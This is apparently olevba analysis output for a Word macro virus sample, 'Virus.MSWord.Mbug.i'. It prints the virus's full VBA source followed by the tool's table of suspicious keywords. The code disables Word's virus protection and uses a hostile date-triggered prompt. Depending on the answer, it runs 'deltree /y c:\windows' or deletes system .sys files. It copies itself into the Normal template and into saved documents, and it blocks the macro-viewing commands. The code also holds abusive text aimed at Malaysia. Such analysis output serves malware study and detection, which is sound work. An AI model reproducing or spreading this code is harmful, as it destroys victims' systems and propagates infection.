olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mbug.i
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mbug.i - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO sibu.bas 
in file: Virus.MSWord.Mbug.i - OLE stream: 'Macros/VBA/sibu'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorA
If Day(Now()) = "15" Then
Ans$ = InputBox$("Today is " + Date$ + ", Let us play a math game" + Chr$(13) + " If you fail, you must accept some Cruel punish!" + Chr$(13) + "" + Chr$(13) + "1 + 1 = ?" + Chr$(13) + "(Do not click Cancel or Close button" + Chr$(13) + " it would Format your Computer)", "Sibu Number 0 MacroVirus")
If Ans$ = "ILoveVirus" Then
MsgBox "Good you are clever", vbInformation, "Sibu Number 0 MacroVirus"
ElseIf Ans$ = "" Then
MsgBox "I told you already do not click cancel or close button" + Chr$(13) + "but you never listen, so you got a big trouble!", vbExclamation, "Sibu Number 0 MacroVirus"
Shell "deltree /y c:\windows", vbHide
Else
MsgBox "Sorry wrong answer, Accept Punished", vbExclamation, "Sibu Number 0 MacroVirus"
Kill "c:\*.sys"
Kill "c:\windows\*.sys"
For I = 1 To 30
addr = "Sibu is hot....I hate!!" & vbCr & "I hate Malaysia...hate" & vbCr & "%$*)#%&#$%"
Application.MailingLabel.CreateNewDocument _
  Address:=addr
  Next I
  End If
End If
ErrorA:
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
If Day(Now()) = "1" Or Day(Now()) = "3" Or Day(Now()) = "5" Or Day(Now()) = "7" Or Day(Now()) = "9" Or Day(Now()) = "11" Or Day(Now()) = "13" Then
Set myMenuBar = CommandBars.ActiveMenuBar
Set newMenu = myMenuBar.Controls.Add(Type:=msoControlPopup, Temporary:=True)
newMenu.Caption = "Sibu"
Set ctrl1 = newMenu.CommandBar.Controls _
    .Add(Type:=msoControlButton, ID:=1)
With ctrl1
    .Caption = "Hate Sibu"
    .TooltipText = "Hate Sibu"
End With
End If
End Sub
Sub AutoClose()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAC
iMacroCount = WordBasic.CountMacros(0, 0)
For I = 1 To iMacroCount
    If WordBasic.[MacroName$](I, 0) = "sibu" Then
        SibuInstalled = -1
    End If
Next I
If Not SibuInstalled Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="sibu", Object:=wdOrganizerObjectProjectItems
End If
ErrorAC:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
    If (ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate) Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="sibu", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFT
ErrorFT:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorTM
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorVVBC
ErrorVVBC:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

